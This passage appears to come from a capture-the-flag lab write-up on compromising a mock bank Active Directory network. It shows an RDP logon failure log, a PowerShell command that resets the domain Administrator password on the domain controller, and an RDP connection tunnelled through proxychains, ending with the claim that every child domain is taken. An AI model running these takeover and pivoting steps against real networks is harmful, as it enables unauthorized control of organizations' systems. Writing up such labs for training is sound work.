+[13:26:48:054] [902989:902999] [WARN][com.freerdp.core.nla] - SPNEGO received NTSTATUS: STATUS_LOGON_FAILURE [0xC000006D] from server
+[13:26:48:054] [902989:902999] [ERROR][com.freerdp.core] - nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE [0x00020014]
+[13:26:48:054] [902989:902999] [ERROR][com.freerdp.core.rdp] - rdp_recv_callback: CONNECTION_STATE_NLA - nla_recv_pdu() fail
+[13:26:48:054] [902989:902999] [ERROR][com.freerdp.core.transport] - transport_check_fds: transport->ReceiveCallback() - -1
+```
+
+Not working
+
+**From Administrative PowerShell**
+
+```powershell
+PS C:\Windows\system32> hostname
+BANKDC
+PS C:\Windows\system32> net user Administrator "Password1!" /domain
+The command completed successfully.
+```
+
+Connecting again with the administrator user. Note: two proxies are being used — the first tunneling traffic from WRK1/WRK2 to my attacking machine (direct access to the SERVERs and DC), the other from ROOTDC to my attacking machine (direct access to the `bank.thereserve.loc` child domain).
+
+```bash
+┌──(root㉿kali)-[/tmp/aaa]
+└─$ proxychains -q -f proxychains4.conf xfreerdp /u:Administrator /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.101
+```
+
+Since we have an administrator account, all child domains are owned now and we get the flags.
